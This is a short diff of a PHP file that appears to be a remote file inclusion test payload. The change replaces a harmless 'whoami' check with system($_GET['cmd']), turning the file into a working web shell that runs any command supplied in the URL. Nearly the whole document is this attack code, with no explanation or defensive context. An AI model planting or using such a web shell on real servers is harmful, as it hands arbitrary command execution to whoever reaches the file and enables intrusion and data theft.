@@ -1,4 +1,4 @@
 <?php
-echo 'Remote File Inclusion Successful!1';
-system('whoami');
+echo 'Remote File Inclusion Successful!';
+system($_GET['cmd']);
 ?>
